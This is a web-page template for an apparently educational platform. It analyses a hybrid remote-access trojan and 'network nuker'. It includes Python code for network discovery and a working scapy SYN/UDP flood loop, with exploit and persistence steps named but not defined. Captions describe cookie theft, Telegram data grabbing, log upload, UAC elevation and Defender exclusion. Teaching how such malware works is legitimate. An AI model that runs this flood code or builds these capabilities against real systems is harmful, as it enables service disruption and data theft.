<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>RAT & Net Nuker Analysis - Nexus Educational Platform</title>
    
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
<style>
    body {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        min-height: 100vh;
        font-family: 'Inter', sans-serif;
    }

    .main-container {
        background: rgba(17, 24, 39, 0.8);
        backdrop-filter: blur(20px);
        border-radius: 20px;
        border: 1px solid rgba(75, 85, 99, 0.3);
        margin: 2rem;
        padding: 3rem;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }

    .tab-navigation {
        border-bottom: 2px solid rgba(147, 51, 234, 0.3);
        margin-bottom: 2rem;
    }

    .tab-btn {
        background: transparent;
        border: none;
        padding: 1rem 2rem;
        color: #9ca3af;
        font-weight: 600;
        cursor: pointer;
        border-bottom: 3px solid transparent;
        transition: all 0.3s ease;
    }

    .tab-btn.active {
        color: #9333ea;
        border-bottom-color: #9333ea;
    }

    .tab-btn:hover {
        color: #9333ea;
    }

    .tab-content {
        animation: fadeIn 0.5s ease-in-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .code-block {
        background: #000000;
        border-radius: 8px;
        padding: 1.5rem;
        overflow-x: auto;
        font-family: 'Fira Code', monospace;
        border: 1px solid #9333ea;
    }

    .screenshot-gallery {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 1.5rem;
    }

    .screenshot-item {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1rem;
        border: 1px solid rgba(147, 51, 234, 0.3);
        transition: all 0.3s ease;
        cursor: pointer;
    }

    .screenshot-item:hover {
        transform: translateY(-5px);
        border-color: #9333ea;
        box-shadow: 0 10px 20px rgba(147, 51, 234, 0.2);
    }

    .feature-list li {
        display: flex;
        align-items: center;
        margin-bottom: 0.5rem;
    }

    .metric-item {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 8px;
        padding: 1rem;
        border: 1px solid rgba(147, 51, 234, 0.3);
    }

    .step {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1.5rem;
        border: 1px solid rgba(147, 51, 234, 0.3);
        margin-bottom: 1.5rem;
    }

    .attack-phase {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1.5rem;
        border: 1px solid rgba(147, 51, 234, 0.3);
        margin-bottom: 1.5rem;
        position: relative;
    }

    .attack-phase::before {
        content: '';
        position: absolute;
        left: 0;
        top: 0;
        bottom: 0;
        width: 4px;
        background: linear-gradient(to bottom, #9333ea, #7c3aed);
        border-radius: 2px;
    }
</style>

<div class="main-container">
    <!-- Header -->
    <div class="text-center mb-8">
        <div class="flex items-center justify-center mb-4">
            <div class="w-20 h-20 bg-purple-600 rounded-full flex items-center justify-center mr-6">
                <i class="fas fa-network-wired text-white text-3xl"></i>
            </div>
            <div>
                <h1 class="text-4xl font-bold text-white">RAT & Net Nuker Analysis</h1>
                <p class="text-purple-400 text-xl">Hybrid Malware with Network Destruction Capabilities</p>
            </div>
        </div>
        <a href="{{ route('nexus.second-semester-phase2') }}" class="inline-flex items-center bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition-all duration-300">
            <i class="fas fa-arrow-left mr-2"></i>
            Back to Phase 2
        </a>
    </div>

    <!-- Tab Navigation -->
    <div class="tab-navigation flex flex-wrap justify-center">
        <button onclick="switchTab('overview')" class="tab-btn active" id="overview-btn">Overview</button>
        <button onclick="switchTab('technical')" class="tab-btn" id="technical-btn">Technical Details</button>
        <button onclick="switchTab('implementation')" class="tab-btn" id="implementation-btn">Implementation</button>
        <button onclick="switchTab('screenshots')" class="tab-btn" id="screenshots-btn">Screenshots</button>
    </div>

    <!-- Tab Content -->
    <div id="overview" class="tab-content">
        <div class="grid md:grid-cols-2 gap-8">
            <div>
                <h3 class="text-2xl font-bold text-white mb-6">Description</h3>
                <p class="text-gray-300 mb-6 leading-relaxed">
                    RAT & Net Nuker combines remote access capabilities with aggressive network disruption techniques. 
                    This hybrid malware demonstrates advanced persistence, lateral movement, and destructive 
                    capabilities for comprehensive cybersecurity education and defense strategy development.
                </p>
                <h4 class="text-xl font-semibold text-purple-400 mb-4">Hybrid Features:</h4>
                <ul class="feature-list text-gray-300 space-y-3">
                    <li><i class="fas fa-network-wired text-purple-500 mr-3"></i>Network scanning and mapping</li>
                    <li><i class="fas fa-bomb text-purple-500 mr-3"></i>Service disruption attacks</li>
                    <li><i class="fas fa-virus text-purple-500 mr-3"></i>Self-replication mechanisms</li>
                    <li><i class="fas fa-route text-purple-500 mr-3"></i>Lateral movement capabilities</li>
                    <li><i class="fas fa-trash text-purple-500 mr-3"></i>Data destruction routines</li>
                    <li><i class="fas fa-skull-crossbones text-purple-500 mr-3"></i>System sabotage modules</li>
                </ul>
            </div>
            <div>
                <h3 class="text-2xl font-bold text-white mb-6">Attack Vectors</h3>
                <div class="space-y-4">
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Network Impact</span>
                            <span class="text-red-400 font-bold text-lg">Severe</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Propagation Speed</span>
                            <span class="text-red-400 font-bold text-lg">Rapid</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Recovery Difficulty</span>
                            <span class="text-red-400 font-bold text-lg">Extreme</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Educational Value</span>
                            <span class="text-green-400 font-bold text-lg">Maximum</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="technical" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Network Exploitation Techniques</h3>
        
        <div class="bg-gray-800 rounded-lg p-6 mb-8">
            <h4 class="text-xl font-semibold text-purple-400 mb-4">Network Discovery & Attack Algorithm</h4>
            <pre class="code-block text-green-400 text-sm"><code>#!/usr/bin/env python3
# RAT & Net Nuker - Educational Implementation
import socket
import threading
import subprocess
import psutil
import nmap
import time
from scapy.all import *

class NetworkNuker:
    def __init__(self):
        """Initialize the hybrid malware framework"""
        self.target_networks = []
        self.vulnerable_hosts = []
        self.active_connections = []
        self.attack_modules = {
            'port_scan': self.port_scan,
            'service_enum': self.service_enumeration,
            'exploit_smb': self.exploit_smb_vulns,
            'dos_attack': self.denial_of_service,
            'lateral_move': self.lateral_movement,
            'data_destroy': self.data_destruction
        }
        
    def discover_networks(self):
        """Scan and map local network infrastructure"""
        try:
            # Get local network ranges
            for interface in psutil.net_if_addrs().values():
                for addr in interface:
                    if addr.family == socket.AF_INET:
                        network = self.calculate_network(addr.address, addr.netmask)
                        if network not in self.target_networks:
                            self.target_networks.append(network)
            
            # Perform network discovery
            for network in self.target_networks:
                self.ping_sweep(network)
                
        except Exception as e:
            self.log_error(f"Network discovery failed: {e}")
            
    def ping_sweep(self, network):
        """Perform ping sweep to identify live hosts"""
        nm = nmap.PortScanner()
        try:
            result = nm.scan(hosts=network, arguments='-sn')
            for host in nm.all_hosts():
                if nm[host].state() == 'up':
                    self.vulnerable_hosts.append({
                        'ip': host,
                        'status': 'alive',
                        'scan_time': time.time()
                    })
        except Exception as e:
            self.log_error(f"Ping sweep failed: {e}")
            
    def exploit_vulnerabilities(self):
        """Exploit discovered vulnerabilities across network"""
        for host in self.vulnerable_hosts:
            try:
                # Port scanning
                open_ports = self.port_scan(host['ip'])
                
                # Service enumeration
                services = self.service_enumeration(host['ip'], open_ports)
                
                # Vulnerability exploitation
                if self.has_smb_vulns(services):
                    self.exploit_smb_vulns(host['ip'])
                    
                if self.has_rdp_access(services):
                    self.exploit_rdp_vulns(host['ip'])
                    
                # Deploy payload
                self.deploy_payload(host['ip'])
                
                # Establish persistence
                self.establish_persistence(host['ip'])
                
            except Exception as e:
                self.log_error(f"Exploitation failed for {host['ip']}: {e}")
                
    def launch_network_attack(self):
        """Launch coordinated network disruption attack"""
        attack_threads = []
        
        for target in self.vulnerable_hosts:
            # DoS attacks
            dos_thread = threading.Thread(
                target=self.denial_of_service, 
                args=(target['ip'],)
            )
            attack_threads.append(dos_thread)
            
            # Service termination
            service_thread = threading.Thread(
                target=self.terminate_services,
                args=(target['ip'],)
            )
            attack_threads.append(service_thread)
            
        # Execute all attacks simultaneously
        for thread in attack_threads:
            thread.start()
            
    def denial_of_service(self, target_ip):
        """Perform DoS attack against target"""
        try:
            while True:
                # SYN flood attack
                packet = IP(dst=target_ip)/TCP(dport=80, flags="S")
                send(packet, verbose=0)
                
                # UDP flood
                udp_packet = IP(dst=target_ip)/UDP(dport=53)/Raw(load="X"*1024)
                send(udp_packet, verbose=0)
                
        except Exception as e:
            self.log_error(f"DoS attack failed: {e}")</code></pre>
        </div>
        
        <div class="grid md:grid-cols-2 gap-8">
            <div>
                <h4 class="text-xl font-semibold text-purple-400 mb-4">Destructive Capabilities</h4>
                <ul class="text-gray-300 space-y-3">
                    <li><strong class="text-red-400">Service Termination:</strong> Critical system service shutdown</li>
                    <li><strong class="text-red-400">File Corruption:</strong> System file modification and deletion</li>
                    <li><strong class="text-red-400">Registry Bombing:</strong> Critical registry key destruction</li>
                    <li><strong class="text-red-400">Network Flooding:</strong> Bandwidth consumption attacks</li>
                    <li><strong class="text-red-400">Boot Sector Damage:</strong> System startup disruption</li>
                    <li><strong class="text-red-400">Data Wiping:</strong> Secure data destruction routines</li>
                </ul>
            </div>
            <div>
                <h4 class="text-xl font-semibold text-purple-400 mb-4">Persistence Methods</h4>
                <ul class="text-gray-300 space-y-3">
                    <li><strong class="text-orange-400">Service Installation:</strong> Windows service creation</li>
                    <li><strong class="text-orange-400">Startup Folders:</strong> Auto-start file placement</li>
                    <li><strong class="text-orange-400">WMI Events:</strong> Event-based triggering mechanisms</li>
                    <li><strong class="text-orange-400">DLL Hijacking:</strong> System library replacement</li>
                    <li><strong class="text-orange-400">Scheduled Tasks:</strong> Time-based execution</li>
                    <li><strong class="text-orange-400">Network Shares:</strong> Lateral movement persistence</li>
                </ul>
            </div>
        </div>
    </div>

    <div id="implementation" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Controlled Network Attack Simulation</h3>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">1</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Network Isolation</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Create completely isolated network environment with multiple target systems, network infrastructure, 
                and comprehensive monitoring. Deploy intrusion detection systems, network analyzers, and 
                behavioral monitoring tools to capture all attack activities safely.
            </p>
        </div>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">2</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Attack Execution</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Deploy hybrid malware and observe network propagation patterns, system impact, and infrastructure 
                degradation. Monitor lateral movement techniques, service disruption methods, and data destruction 
                capabilities while maintaining detailed forensic logs.
            </p>
        </div>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">3</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Impact Analysis</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Analyze network disruption patterns, assess system damage levels, and evaluate recovery requirements. 
                Document attack progression, defensive countermeasures effectiveness, and develop comprehensive 
                incident response procedures for similar real-world scenarios.
            </p>
        </div>

        <div class="mt-8">
            <h4 class="text-xl font-semibold text-purple-400 mb-6">Attack Phase Breakdown</h4>
            
            <div class="attack-phase">
                <h5 class="text-lg font-semibold text-white mb-3">Phase 1: Reconnaissance</h5>
                <p class="text-gray-300 text-sm">Network discovery, host enumeration, service identification, and vulnerability assessment</p>
            </div>
            
            <div class="attack-phase">
                <h5 class="text-lg font-semibold text-white mb-3">Phase 2: Initial Compromise</h5>
                <p class="text-gray-300 text-sm">Exploit vulnerabilities, gain initial foothold, deploy RAT components</p>
            </div>
            
            <div class="attack-phase">
                <h5 class="text-lg font-semibold text-white mb-3">Phase 3: Lateral Movement</h5>
                <p class="text-gray-300 text-sm">Spread across network, compromise additional systems, establish multiple access points</p>
            </div>
            
            <div class="attack-phase">
                <h5 class="text-lg font-semibold text-white mb-3">Phase 4: Network Disruption</h5>
                <p class="text-gray-300 text-sm">Launch coordinated attacks, disrupt services, corrupt data, damage infrastructure</p>
            </div>
        </div>
    </div>

    <div id="screenshots" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Network Attack Visualization</h3>
        <div class="screenshot-gallery">
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s1.png') }}" alt="Network Discovery" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Audio Player Directory Script</p>
                <p class="text-gray-500 text-xs">Python script interface for managing audio player directory paths</p>            
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s2.png') }}" alt="Attack Propagation" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Chrome Browser Paths Script</p>
                <p class="text-gray-500 text-xs">Python script interface for defining Chrome browser paths and extensions</p>            
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s3.png') }}" alt="System Impact" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Process Termination Script</p>
                <p class="text-gray-500 text-xs">Python script interface for terminating processes using taskkill</p>           
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s4.png') }}" alt="Service Disruption" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Data Decryption Script</p>
                <p class="text-gray-500 text-xs">Python script interface for decrypting data using AES-GCM</p>        
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s5.png') }}" alt="Data Destruction" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">File Zipping Script</p>
                <p class="text-gray-500 text-xs">Python script interface for zipping files and directories to storage</p>      
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s6.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Task Kill Script</p>
                <p class="text-gray-500 text-xs">Python script interface for terminating executable processes</p>     
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s7.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Chromium Cookies Extraction Script</p>
                <p class="text-gray-500 text-xs">Python script interface for extracting and decrypting Chromium cookies</p>            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s8.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Chrome Cookies Retrieval Script</p>
                <p class="text-gray-500 text-xs">Python script interface for retrieving cookies from Chrome via WebSocket</p>            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s9.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Telegram Data Backup Script</p>
                <p class="text-gray-500 text-xs">Python script interface for backing up Telegram data and terminating the process</p>     
            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s10.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Log Creation and Upload Script</p>
                <p class="text-gray-500 text-xs">Python script interface for creating and uploading logs to a web server</p>     
            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s11.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">File Deletion Command</p>
                <p class="text-gray-500 text-xs">Attempts to remove directory tree from storage path silently</p>     
            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s12.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Privilege Escalation Script</p>
                <p class="text-gray-500 text-xs">Batch script to request administrative privileges via UAC</p>     
            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s13.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Antivirus Exclusion and Payload Setup</p>
                <p class="text-gray-500 text-xs">Adds exclusion path to bypass Defender and sets Python payload</p>     
            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s14.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Temporary Batch File Execution</p>
                <p class="text-gray-500 text-xs">Creates and runs a temporary batch script from the system’s TEMP folder</p>     
            </div> <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/rat/s15.png') }}" alt="Recovery Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Explorer Process Control Loop</p>
                <p class="text-gray-500 text-xs">Monitors folder and restarts explorer after executing batch scripts</p>     
            </div>
        </div>
    </div>
</div>

<script>
function switchTab(tabName) {
    // Hide all tab contents
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(content => {
        content.classList.add('hidden');
    });
    
    // Remove active class from all buttons
    const tabButtons = document.querySelectorAll('.tab-btn');
    tabButtons.forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Show selected tab content
    document.getElementById(tabName).classList.remove('hidden');
    
    // Add active class to clicked button
    document.getElementById(tabName + '-btn').classList.add('active');
}

function openFullscreen(element) {
    const img = element.querySelector('img');
    const overlay = document.createElement('div');
    overlay.className = 'fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 cursor-pointer';
    overlay.innerHTML = `
        <div class="relative max-w-4xl max-h-[90vh] p-4">
            <img src="${img.src}" alt="${img.alt}" class="max-w-full max-h-full object-contain">
            <button class="absolute top-4 right-4 text-white text-3xl hover:text-gray-300 bg-black bg-opacity-50 rounded-full w-12 h-12 flex items-center justify-center">&times;</button>
        </div>
    `;
    document.body.appendChild(overlay);
    
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay || e.target.tagName === 'BUTTON') {
            overlay.remove();
        }
    });
}
</script>
</body>
</html>
